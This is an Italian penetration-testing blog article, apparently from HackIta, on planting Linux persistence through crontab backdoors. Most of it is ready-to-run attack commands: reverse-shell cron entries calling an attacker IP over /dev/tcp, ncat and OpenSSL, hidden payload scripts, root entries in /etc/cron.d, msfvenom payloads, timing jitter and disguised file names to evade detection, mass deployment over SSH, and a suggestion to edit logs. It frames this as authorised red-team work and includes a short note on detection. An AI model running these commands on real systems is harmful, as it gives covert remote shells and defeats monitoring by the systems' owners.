---
title: 'Crontab Backdoor: Persistenza Linux con Cron Job nel Penetration Testing'
slug: crontab
description: 'Crontab Backdoor: guida operativa per creare persistenza Linux con cron job in penetration test. Setup, evasion e cleanup completi.'
image: /Gemini_Generated_Image_huoubbhuoubbhuou.webp
draft: true
date: 2026-02-07T00:00:00.000Z
categories:
  - linux
subcategories:
  - privilege-escalation
tags:
  - persistence
  - cron jobs
featured: true
---

# Crontab Backdoor: Persistenza Linux con Cron Job nel Penetration Testing

## Introduzione

Crontab è il task scheduler nativo di ogni sistema Linux. In un penetration test, sfruttarlo come meccanismo di persistenza significa ottenere un callback ricorrente senza installare software aggiuntivo — un vantaggio operativo enorme. Il Blue Team spesso monitora servizi e processi, ma i cron job dell'utente restano in angoli ciechi se non esiste un SIEM configurato ad hoc.

In questo articolo vedrai come configurare backdoor basate su crontab, integrarle in una attack chain reale, evadere i controlli più comuni e ripulire tutto a fine ingaggio. Nella kill chain, ci posizioniamo nella fase di **Persistence** (MITRE ATT\&CK T1053.003).

***

## 1️⃣ Setup e Prerequisiti

Non serve installazione: cron è presente di default su qualsiasi distribuzione Linux. Verifica che il demone sia attivo:

```bash
systemctl status cron
```

Output atteso:

```
● cron.service - Regular background program processing daemon
     Active: active (running) since Mon 2025-01-20 08:12:33 UTC
```

Se il target usa `cronie` (RHEL/CentOS):

```bash
systemctl status crond
```

**Requisiti:**

* Accesso shell al target (reverse shell o SSH)
* Permessi di scrittura su crontab dell'utente corrente (non serve root per la persistenza base)
* Porta di callback raggiungibile dal target

Verifica che l'utente possa editare il proprio crontab:

```bash
crontab -l
```

Se restituisce `no crontab for user`, puoi crearne uno. Se restituisce un errore di permesso, l'utente è in `/etc/cron.deny`.

***

## 2️⃣ Uso Base

Il formato crontab segue la struttura classica a 5 campi:

```
MIN  ORA  GIORNO  MESE  GIORNO_SETTIMANA  COMANDO
```

Inserire un reverse shell callback ogni 5 minuti:

```bash
crontab -e
```

Aggiungi:

```bash
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1'
```

Verifica l'inserimento:

```bash
crontab -l
```

Output:

```
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1'
```

* `*/5` → ogni 5 minuti
* `/dev/tcp` → funzionalità built-in di bash, nessun binario extra
* `0>&1` → redirect stderr su stdout per shell interattiva

Sul tuo listener:

```bash
nc -lvnp 4444
```

***

## 3️⃣ Tecniche Operative

### One-liner senza editor

In una reverse shell instabile non puoi usare `crontab -e`. Usa l'injection diretta:

```bash
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1'") | crontab -
```

Questo preserva i cron job esistenti e appende il tuo. Fondamentale per non rompere nulla sul target.

### Persistenza con script esterno

Scrivi il payload su disco e richiamalo da cron:

```bash
echo '#!/bin/bash' > /tmp/.update.sh
echo 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1' >> /tmp/.update.sh
chmod +x /tmp/.update.sh
(crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/.update.sh") | crontab -
```

Il file nascosto (prefisso `.`) evita un `ls` casuale. In ambienti senza monitoring, sopravvive per settimane.

### Persistenza via /etc/cron.d (richiede root)

Se hai ottenuto root, puoi scrivere direttamente in `/etc/cron.d/`:

```bash
echo '*/15 * * * * root /bin/bash -c "bash -i >& /dev/tcp/10.10.14.22/4444 0>&1"' > /etc/cron.d/.sysupdate
chmod 644 /etc/cron.d/.sysupdate
```

Nota il campo utente (`root`) obbligatorio nei file di `/etc/cron.d/`.

***

## 4️⃣ Tecniche Avanzate

### Callback con netcat variante

Alcune distribuzioni non supportano `/dev/tcp`. Alternativa con `ncat`:

```bash
*/5 * * * * ncat 10.10.14.22 4444 -e /bin/bash
```

### Callback cifrato con OpenSSL

Per evitare detection basata su contenuto in chiaro:

```bash
*/10 * * * * mkfifo /tmp/.f; /bin/sh -i < /tmp/.f 2>&1 | openssl s_client -quiet -connect 10.10.14.22:4443 > /tmp/.f; rm /tmp/.f
```

Listener:

```bash
openssl s_server -quiet -key key.pem -cert cert.pem -port 4443
```

Il traffico è TLS-encrypted. IDS basati su signature non vedono il payload.

### Cron job con jitter temporale

Un callback ogni 5 minuti esatti è sospetto. Aggiungi casualità:

```bash
*/10 * * * * sleep $((RANDOM \% 120)) && /tmp/.update.sh
```

Il `sleep` randomico (0-120 secondi) rompe il pattern temporale regolare che il Blue Team potrebbe identificare.

### Persistenza multi-layer

Combina crontab utente + `/etc/cron.d/` + at job per ridondanza:

```bash
echo "/tmp/.update.sh" | at now + 60 minutes
```

Se il Blue Team rimuove il cron job, il job `at` lo ricrea.

***

## 5️⃣ Scenari Pratici di Pentest

### Scenario 1: Web Server compromesso — Callback post-exploit

```bash
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1'") | crontab -
```

**Output atteso:** nessun output (exit code 0). Verifica con `crontab -l`.

**Cosa fare se fallisce:**

* Errore `Permission denied` → L'utente è in `/etc/cron.deny`. Prova a scrivere direttamente in `/var/spool/cron/crontabs/www-data` se hai permessi di scrittura su quel path.
* Errore `command not found` → Crontab non installato. Usa `at` come alternativa: `echo "bash -i >& /dev/tcp/10.10.14.22/4444 0>&1" | at now + 5 minutes`.

**Timeline:** 30 secondi per l'inserimento, primo callback entro 5 minuti.

### Scenario 2: Container Docker con cron disabilitato

```bash
apt-get install -y cron && service cron start
(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/.update.sh") | crontab -
```

**Output atteso:** `Starting periodic command scheduler: cron.`

**Cosa fare se fallisce:**

* `apt-get` non disponibile → prova `apk add dcron` (Alpine) o scrivi un loop bash come alternativa: `while true; do /tmp/.update.sh; sleep 300; done &`
* Container senza init → cron non parte. Il loop bash in background è l'unica opzione.

**Timeline:** 1-2 minuti per installazione + avvio.

### Scenario 3: Target con auditd attivo

```bash
echo '#!/bin/bash' > /dev/shm/.cache.sh
echo 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1' >> /dev/shm/.cache.sh
chmod +x /dev/shm/.cache.sh
(crontab -l 2>/dev/null; echo "*/10 * * * * /dev/shm/.cache.sh") | crontab -
```

**Output atteso:** nessun output.

**Cosa fare se fallisce:**

* `/dev/shm` montato con `noexec` → usa `/tmp` o `/var/tmp`.
* auditd logga la modifica crontab → Il log esiste ma se non c'è alerting attivo, non importa. Prioritizza il cleanup a fine ingaggio.

**Timeline:** 20 secondi. Primo callback entro 10 minuti.

***

## 6️⃣ Toolchain Integration

La crontab backdoor si inserisce naturalmente dopo l'accesso iniziale e prima del pivoting.

**Flusso tipico:**

Nmap (recon) → Exploit web/SSH → **Crontab Backdoor (persistence)** → [SSHuttle](https://hackita.it/articoli/sshuttle) (pivoting)

Il payload del cron job può essere generato con msfvenom e ricevuto con il multi/handler di Metasploit:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.22 LPORT=4444 -f elf -o /tmp/.cache
chmod +x /tmp/.cache
(crontab -l 2>/dev/null; echo "*/10 * * * * /tmp/.cache") | crontab -
```

Se stai operando con [ProxyChains](https://hackita.it/articoli/proxychains) per raggiungere segmenti interni, il cron job garantisce che la sessione sulla macchina compromessa sopravviva a disconnessioni della catena proxy.

| Scenario              | Crontab Backdoor    | Systemd Service | RC.local |
| --------------------- | ------------------- | --------------- | -------- |
| Richiede root         | No (crontab utente) | Sì              | Sì       |
| Sopravvive a reboot   | Sì                  | Sì              | Sì       |
| Facilità di detection | Media               | Alta            | Bassa    |
| Setup time            | 10 sec              | 60 sec          | 30 sec   |
| Compatibilità         | Universale          | Systemd only    | Legacy   |

***

## 7️⃣ Attack Chain Completa

**Obiettivo:** Accesso persistente a un server web Linux in una rete segmentata.

**Fase 1 — Recon (15 min)**

```bash
nmap -sV -sC -p- 10.10.10.50
```

Identifica porta 80 (Apache) e porta 22 (SSH).

**Fase 2 — Initial Access (20 min)**

Exploit di una vulnerabilità web (es. file upload su CMS) per ottenere una reverse shell come `www-data`.

**Fase 3 — Persistence (1 min)**

```bash
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1'") | crontab -
```

**Fase 4 — Privilege Escalation (30 min)**

Enumera con linpeas. Trovi un binario SUID custom. Escalation a root.

Come root, aggiungi persistenza ridondante:

```bash
echo '*/15 * * * * root /bin/bash -c "bash -i >& /dev/tcp/10.10.14.22/5555 0>&1"' > /etc/cron.d/.syshealth
```

**Fase 5 — Pivoting (15 min)**

Usa [SSHuttle](https://hackita.it/articoli/sshuttle) dal tuo attacker box per raggiungere la subnet interna 172.16.0.0/24 attraverso la macchina compromessa. Il cron job mantiene l'accesso anche se SSHuttle cade.

**Timeline totale stimata:** \~80 minuti.

***

## 8️⃣ Detection & Evasion

### Cosa monitora il Blue Team

* **Modifiche a crontab:** il file `/var/spool/cron/crontabs/<user>` viene modificato. Auditd può loggare con regola su quel path.
* **Processi figli di cron:** il processo `cron` spawna shell → `bash` → connessione outbound. EDR come Wazuh o CrowdStrike lo flaggano.
* **Connessioni outbound ricorrenti:** pattern regolare di connessioni TCP verso lo stesso IP ogni N minuti.

### Log rilevanti

* `/var/log/syslog` → entry `CRON[pid]: (user) CMD (comando)`
* auditd → `SYSCALL` + `EXECVE` se la regola è attiva
* `/var/log/auth.log` → se crontab viene modificato via SSH

### Tecniche di evasion

1. **Naming convention legittimo:** rinomina lo script in qualcosa che sembri un job di sistema:

```bash
cp /tmp/.update.sh /usr/local/bin/logrotate-daily.sh
```

1. **Output redirection:** evita log in syslog sopprimendo stdout/stderr nel cron job:

```bash
*/10 * * * * /usr/local/bin/logrotate-daily.sh > /dev/null 2>&1
```

1. **Traffico su porta 443:** usa porta 443 per il callback. Il traffico si confonde con HTTPS legittimo.

### Cleanup post-exploitation

```bash
crontab -r
rm -f /etc/cron.d/.syshealth
rm -f /tmp/.update.sh /dev/shm/.cache.sh
```

Verifica che syslog non contenga più entry CRON con il tuo comando. Se possibile, edita i log (solo con autorizzazione esplicita del cliente).

***

## 9️⃣ Performance & Scaling

**Single target:** impatto zero. Un cron job ogni 5 minuti consuma risorse trascurabili.

**Multi target:** in un ingaggio con 20+ macchine compromesse, usa un loop per deployare il cron job via SSH:

```bash
for host in $(cat targets.txt); do
  ssh user@$host "(crontab -l 2>/dev/null; echo '*/10 * * * * /tmp/.cb.sh') | crontab -"
done
```

**Consumo risorse:** il cron daemon usa \~2MB di RAM. Ogni esecuzione del job spawna un processo bash che vive finché la connessione è attiva. Se il listener non è raggiungibile, il processo muore in pochi secondi (timeout TCP).

**Ottimizzazione:** per ingaggi lunghi, aumenta l'intervallo a 15-30 minuti per ridurre il rumore nei log.

***

## 🔟 Tabelle Tecniche

### Command Reference

| Comando                 | Descrizione                              |
| ----------------------- | ---------------------------------------- |
| `crontab -l`            | Lista cron job dell'utente corrente      |
| `crontab -e`            | Edita crontab dell'utente                |
| `crontab -r`            | Rimuove tutti i cron job dell'utente     |
| `crontab -u user -l`    | Lista cron job di un altro utente (root) |
| `cat /etc/crontab`      | Visualizza crontab di sistema            |
| `ls /etc/cron.d/`       | Lista job in cron.d                      |
| `systemctl status cron` | Stato del demone cron                    |

### Confronto metodi di persistenza Linux

| Metodo            | Stealth | Sopravvive reboot | Richiede root | Complessità |
| ----------------- | ------- | ----------------- | ------------- | ----------- |
| Crontab utente    | ★★★☆    | Sì                | No            | Bassa       |
| /etc/cron.d/      | ★★☆☆    | Sì                | Sì            | Bassa       |
| Systemd timer     | ★★☆☆    | Sì                | Sì            | Media       |
| .bashrc injection | ★★★★    | Sì (al login)     | No            | Bassa       |
| LD\_PRELOAD       | ★★★★    | Sì                | Sì            | Alta        |
| Kernel module     | ★★★★★   | Sì                | Sì            | Molto alta  |

***

## 11️⃣ Troubleshooting

| Problema                         | Causa                      | Fix                                       |
| -------------------------------- | -------------------------- | ----------------------------------------- |
| Cron job non esegue              | Demone cron non attivo     | `systemctl start cron`                    |
| Reverse shell non arriva         | Firewall blocca outbound   | Usa porta 53 o 443                        |
| `Permission denied` su crontab   | Utente in `/etc/cron.deny` | Scrivi direttamente in `/var/spool/cron/` |
| `/dev/tcp` non funziona          | Shell non è bash           | Specifica `/bin/bash -c` nel job          |
| Job esegue ma shell muore subito | Listener non attivo        | Avvia `nc -lvnp` prima del trigger        |
| Script non eseguibile            | Manca `chmod +x`           | Aggiungi permessi di esecuzione           |

***

## 12️⃣ FAQ

**Il cron job sopravvive a un reboot?**
Sì, i cron job utente sono persistenti. Il file resta in `/var/spool/cron/crontabs/`.

**Posso usare crontab senza accesso interattivo?**
Sì, usa il one-liner con pipe: `(crontab -l; echo "...") | crontab -`.

**Come nascondo il cron job da `crontab -l`?**
Non puoi nasconderlo dal comando. Puoi però nominare lo script con un nome legittimo e usare un path di sistema per ridurre i sospetti.

**Funziona su macOS?**
Sì, macOS ha cron. Ma `launchd` è più comune e meno monitorato su quel sistema.

**Qual è l'intervallo minimo consigliato?**
5 minuti per operazioni tattiche brevi. 15-30 minuti per ingaggi prolungati dove il rumore va minimizzato.

**Come verifico che il job sia attivo senza aspettare?**
Esegui manualmente lo script: `bash /tmp/.update.sh` e verifica il callback.

***

## 13️⃣ Cheat Sheet

| Azione                        | Comando                                                                                                     |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------- |
| Inserire backdoor (one-liner) | `(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'") \| crontab -` |
| Backdoor con script nascosto  | `echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' > /tmp/.x.sh && chmod +x /tmp/.x.sh`                               |
| Persistenza root via cron.d   | `echo '*/15 * * * * root /tmp/.x.sh' > /etc/cron.d/.job`                                                    |
| Callback TLS con OpenSSL      | `openssl s_client -quiet -connect IP:PORT`                                                                  |
| Aggiungere jitter             | `sleep $((RANDOM \% 120)) && /tmp/.x.sh`                                                                    |
| Verifica job attivi           | `crontab -l`                                                                                                |
| Cleanup completo              | `crontab -r && rm /etc/cron.d/.job /tmp/.x.sh`                                                              |

***

**Disclaimer:** Questo contenuto è destinato esclusivamente a professionisti di sicurezza informatica che operano in ambienti autorizzati (penetration test, Red Team engagement, laboratori). L'uso non autorizzato di queste tecniche è illegale. Riferimento: [cron documentation](https://man7.org/linux/man-pages/man5/crontab.5.html).

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
